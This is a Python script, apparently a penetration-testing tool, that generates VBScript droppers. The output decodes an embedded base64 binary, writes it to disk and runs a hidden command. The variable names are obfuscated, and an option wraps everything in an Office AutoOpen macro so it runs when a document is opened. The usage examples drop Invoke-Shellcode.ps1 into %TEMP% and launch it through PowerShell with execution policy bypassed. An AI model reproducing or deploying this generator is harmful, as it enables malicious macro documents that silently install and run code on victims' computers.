#!/usr/bin/python

###
# Author: Rich Lundeen
#
# simple script that generates vbs files that upload binaries and execute things
#
###

import argparse
import random
import re
import sys
import binascii

class vbs_gen:

	def __init__(self, args):
		self.vb_code = ""
		self.args = args
		if not args.cmd and not args.writeFilePath:
			sys.stderr.write("Error: must execute a command or write a file (or both). See --help")

		self.create_vartable()
		self.genvbs_header()
		self.genvbs_getTemp()
		if self.args.inputFile:
			self.genvbs_writefile()
		if self.args.cmd:
			self.genvbs_execfile()

		self.genvbs_invokecode()

		print self.vb_code
	
	#returns a random lowercase letter of a given length
	def rand_alpha(self, strlength=10):
		word = ""
		for i in range(0,strlength):
			word += chr(random.randint(0x61, 0x7a))
		return word

	def create_vartable(self):
		self.var_dict = {}
		#randomized vbscript variables to make the output slightly less intuitive to read
		self.var_dict['base64']   = self.rand_alpha()
		self.var_dict['binaryStream']   = self.rand_alpha()
		self.var_dict['cmd']            = self.rand_alpha()
		self.var_dict['colEnvironment'] = self.rand_alpha()
		self.var_dict['decodeBase64']   = self.rand_alpha()
		self.var_dict['envObj']         = self.rand_alpha()
		self.var_dict['execfile']       = self.rand_alpha()
		self.var_dict['getVar']         = self.rand_alpha()
		self.var_dict['objshell']       = self.rand_alpha()
		self.var_dict['objPath']        = self.rand_alpha()
		self.var_dict['runObj']        = self.rand_alpha()
		self.var_dict['sc']             = self.rand_alpha()
		self.var_dict['sysPath']        = self.rand_alpha()
		self.var_dict['tempPath']       = self.rand_alpha()
		self.var_dict['writeBytes']     = self.rand_alpha()
		self.var_dict['writeFile']     = self.rand_alpha()

	def getvar(self, var):
		if var not in self.var_dict:
			raise Exception("Bad variable")
		if self.args.debug:
			return var
		else:
			return self.var_dict[var]

	def genvbs_header(self):
		self.vb_code += """
Option Explicit

Const TypeBinary = 1
Const ForReading = 1, ForWriting = 2, ForAppending = 8
"""

	def genvbs_getTemp(self):
		self.vb_code += "\n"
		self.vb_code += "Private Function " + self.getvar("getVar") + "(mvar)\n"
		self.vb_code += "  Dim " + self.getvar("objshell") + "\n"
		self.vb_code += "  Dim " + self.getvar("envObj") + "\n"
		self.vb_code += "  Set " + self.getvar("objshell") + " = CreateObject(\"WScript.Shell\")\n"
		self.vb_code += "  Set " + self.getvar("envObj") + " = " + self.getvar("objshell") + ".Environment(\"PROCESS\")\n"
		self.vb_code += "  " + self.getvar("getVar") + " = " + self.getvar("envObj") + "(mvar)\n"
		self.vb_code += "End Function\n"

	#creates a few functions, most useful is 'writeFile' sub
	def genvbs_writefile(self):
		#decode base64 and writeBytes functions
 		self.vb_code += "\n"
 		self.vb_code += "Private Function " + self.getvar("decodeBase64") + "(" + self.getvar("base64") + ")\n"
 		self.vb_code += "  Dim DM, EL\n"
 		self.vb_code += "  Set DM = CreateObject(\"Microsoft.XMLDOM\")\n"
 		self.vb_code += "  Set EL = DM.createElement(\"tmp\")\n"
 		self.vb_code += "  EL.DataType = \"bin.base64\"\n"
 		self.vb_code += "  EL.Text = " + self.getvar("base64") + "\n"
 		self.vb_code += "  " + self.getvar("decodeBase64") + " = EL.NodeTypedValue\n"
 		self.vb_code += "End Function\n"
 		self.vb_code += "\n"
 		self.vb_code += "Private Sub " + self.getvar("writeBytes") + "(file, bytes)\n"
 		self.vb_code += "  Dim " + self.getvar("binaryStream") + "\n"
 		self.vb_code += "  Set " + self.getvar("binaryStream") + " = CreateObject(\"ADODB.Stream\")\n"
 		self.vb_code += "  " + self.getvar("binaryStream") + ".Type = TypeBinary\n"
 		self.vb_code += "  " + self.getvar("binaryStream") + ".Open\n"
 		self.vb_code += "  " + self.getvar("binaryStream") + ".Write bytes\n"
 		self.vb_code += "  " + self.getvar("binaryStream") + ".SaveToFile file, ForWriting\n"
 		self.vb_code += "End Sub\n"
 		self.vb_code += "\n"

		shellcode = open(self.args.inputFile, 'rb').read()

		b64_shell = shellcode.encode("base64").split("\n")
		sc_str = " Dim " + self.getvar("sc") + "\n"
		for line in b64_shell:
			if line == "":
				continue
			sc_str += "  " + self.getvar("sc") + " = " + self.getvar("sc") + " & \"" + line + "\"\n"

		self.vb_code += "Private Sub " + self.getvar("writeFile") + "()\n " 
		self.vb_code += sc_str +"\n"
		self.vb_code += "  Dim decbytes\n"
		self.vb_code += "  decbytes = " + self.getvar("decodeBase64") + "(" + self.getvar("sc") + ")\n"
		self.vb_code += "  Dim outFile\n"
		self.vb_code += "  outFile = \"" + self.args.writeFilePath + "\"\n"
		self.vb_code += "\n"
		self.vb_code += "  outFile = UCase(outFile)\n"
		self.vb_code += "  outFile = Replace(outFile,\"%TEMP%\", " + self.getvar("getVar") + "(\"temp\"))\n"
		self.vb_code += "  outFile = Replace(outFile,\"%SYSTEMROOT%\", " + self.getvar("getVar") + "(\"windir\"))\n"
		self.vb_code += "  " + self.getvar("writeBytes") + " outFile, decbytes\n"
		self.vb_code += "End Sub\n"
		self.vb_code += "\n"


	def genvbs_execfile(self):
		self.vb_code += "Private Sub " + self.getvar("execfile") + "()\n"
		self.vb_code += "  Dim " + self.getvar("cmd") + "\n"
		self.vb_code += "  " + self.getvar("cmd") + " = \"" + self.args.cmd + "\"\n"
		self.vb_code += "  " + self.getvar("cmd") + " = Replace(" + self.getvar("cmd") + ", \"%TEMP%\", " + self.getvar("getVar") + "(\"temp\"))\n"
		self.vb_code += "  " + self.getvar("cmd") + " = Replace(" + self.getvar("cmd") + ", \"%SYSTEMROOT%\", " + self.getvar("getVar") + "(\"windir\"))\n"
		self.vb_code += "  Dim " + self.getvar("runObj") + "\n"
		self.vb_code += "  Set " + self.getvar("runObj") + " = CreateObject(\"Wscript.Shell\")\n"
		self.vb_code += "  " + self.getvar("runObj") + ".run " + self.getvar("cmd") + ", 0, true\n"
		self.vb_code += "End Sub\n"
		self.vb_code += "  \n"
  
	def genvbs_invokecode(self):
		self.vb_code += "\n"
		#wrap call in AutopOpen function
		if self.args.office:
			self.vb_code += "Sub AutoOpen()\n"
		if self.args.inputFile:
			self.vb_code += self.getvar("writeFile") + "\n"
		if self.args.cmd:
			self.vb_code += self.getvar("execfile") + "\n"
		if self.args.office:
			self.vb_code += "End Sub\n"


desc = """simple script that generates vbs files that upload binaries and execute things
%TEMP% and %SYSTEMROOT% (case sensative) can be used"""

examples = """

Example: 
  python gen_vbs.py --cmd="C:\\Windows\\System32\\calc.exe"

Example:  
  python gen_vbs.py --inputFile ./Invoke-Shellcode.ps1 --writeFilePath="%TEMP%\\invoke_ping.ps1" \\
  --cmd="%SYSTEMROOT%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -executionpolicy bypass \\
  %TEMP%\\invoke_ping.ps1" 

"""
 
parser = argparse.ArgumentParser(description=desc, epilog=examples, formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument('--cmd', required=False, help='command to run, including args (e.g. "cmd.exe /K dir")')
parser.add_argument('--debug', action="store_true", help='does not obfuscate variable names, so output is easier to read')
parser.add_argument('--office', action="store_true", help='Wraps main in an AutoOpen function that is called when a doc is opened')
parser.add_argument('--inputFile', required=False, help="Local Filename that will be written to host. If null nothing is written")
parser.add_argument('--writeFilePath', default=".\\ping.ps1", required=False, help='Name to write File')

args = parser.parse_args()

vbs_gen(args)

